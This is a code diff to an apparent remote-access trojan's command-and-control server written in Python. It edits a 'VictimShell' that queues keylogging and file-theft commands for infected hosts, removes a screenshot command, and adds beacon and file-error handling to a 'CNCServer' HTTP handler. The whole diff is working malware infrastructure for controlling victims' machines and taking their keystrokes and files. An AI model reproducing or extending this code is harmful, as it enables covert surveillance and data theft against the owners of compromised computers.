@@ -10,6 +10,7 @@ from Exceptions import SEQNumError, SEQSaveError
 
 import threading
 import cmd
+import os
 
 
 # Base Shell
@@ -101,11 +102,6 @@ class VictimShell(BaseShell):
         global victim_table
         victim_table[self.targetIP]['command'].append(arg)
 
-    def do_screenshot(self, arg):
-        '''take screenshot on victim and get it to server'''
-        global victim_table
-        victim_table[self.targetIP]['command'].append('[screenshot]')
-
     def do_show(self, arg):
         '''show (dict|queue)'''
         if arg == 'dict':
@@ -127,51 +123,20 @@ class VictimShell(BaseShell):
         elif parsed_arg[0] == 'keylog':
             victim_table[self.targetIP]['command'].append('[keylog]')
         elif parsed_arg[0] == 'file':
-            if '\\' in parsed_arg[-1]:
-                parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]
+            parsed_arg = parsed_arg[1:]
+            last_argu = parsed_arg[-1]
 
-            if len(parsed_arg) == 2:
-                if path.isfile(FILE_PATH + parsed_arg[1]):
-                    print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
-                    return
-            elif len(parsed_arg) == 3:
-                if path.isfile(FILE_PATH + parsed_arg[2]):
-                    print('{} is already exit in FILE_PATH'.format(parsed_arg[2]))
-                    return
-            else:
-                return self.default('gf ' + arg)
+            if '\\' in last_argu:
+                last_argu = parsed_arg[-1].split('\\')[-1]
+
+            if path.isfile(FILE_PATH + last_argu):
+                print('{} is already exit in FILE_PATH'.format(last_argu))
+                return
             
-            with open(FILE_PATH+parsed_arg[-1], 'wb'):
+            with open(FILE_PATH+last_argu, 'wb'):
                 pass
 
-            victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
-    
-
-    def do_gf(self, arg):
-        '''get victim's file\nusage : gf [file path & name] or gf [victim file path & name] [save name]'''
-        global victim_table
-        
-        parsed_arg = arg.split(' ')
-
-        if '\\' in parsed_arg[-1]:
-            parsed_arg[-1] = parsed_arg[-1].split('\\')[-1]
-
-        if len(parsed_arg) == 1:
-            if path.isfile(FILE_PATH + parsed_arg[0]):
-                print('{} is already exit in FILE_PATH'.format(parsed_arg[0]))
-                return
-        elif len(parsed_arg) == 2:
-            if path.isfile(FILE_PATH + parsed_arg[1]):
-                print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
-                return
-        else:
-            return self.default('gf ' + arg)
-
-
-        with open(FILE_PATH+parsed_arg[-1], 'wb'):
-            pass
-
-        victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
+            victim_table[self.targetIP]['command'].append('[file {}]'.format(" ".join(parsed_arg)))
         
 
 
@@ -415,6 +380,18 @@ class CNCServer(BaseHTTPRequestHandler):
         type_function = getattr(self, "_func_"+parsed_data['type'].lower())
         type_function(victim_ip, ddp_data)
 
+    def _func_error(self, victim_ip : str, ddp_data):
+        # 파일 에러
+        if ddp_data == b'1':  # TODO Error table를 참조하도록 변경
+            global victim_table
+            fileName = victim_table[victim_ip]['seqName'].popleft()
+
+            os.remove(FILE_PATH+fileName)
+
+            Logger.error('FTP File Error : {} not found in {}'.format(fileName, victim_ip))
+
+        self._response_ack()
+
     # 비콘 요청에 대한 처리 함수
     def _func_beacon_request(self, victim_ip : str, ddp_data):
         # 큐에 쌓인 명령어 pop
@@ -430,7 +407,7 @@ class CNCServer(BaseHTTPRequestHandler):
                     self._response_ftp_request("keylog", victim_ip, "{}_{}_keylog.txt".format(victim_ip,datetime.now().strftime('%Y%m%d-%H%M%S')))
                     return
                 # gf 명령어 처리
-                elif data.startswith('[gf'):
+                elif data.startswith('[file'):
                     file_name = data.split(' ')
                     if len(file_name) == 3:
                         self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
